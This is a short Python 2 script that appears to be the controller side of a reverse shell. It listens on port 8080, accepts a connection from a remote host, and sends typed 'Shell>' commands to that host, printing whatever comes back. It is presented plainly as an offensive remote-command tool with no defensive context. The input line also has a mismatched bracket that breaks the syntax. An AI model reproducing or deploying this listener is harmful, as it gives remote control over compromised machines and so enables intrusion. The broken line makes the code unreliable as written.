import socket	# For Building TCP Connection

def connect():

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", 8080))
	s.listen(1)
	conn, addr = s.accept()
	print '[+] We got a connection from: ', addr
	
	while True:
	
		command = raw_input["Shell> ")
		
		if 'terminate' in command:
			conn.send('terminate')
			conn.close() # close the connection with host
			break
			
		else:
			conn.send(command)	# send command
			print conn.recv(1024)
			
def main():
	connect()
main()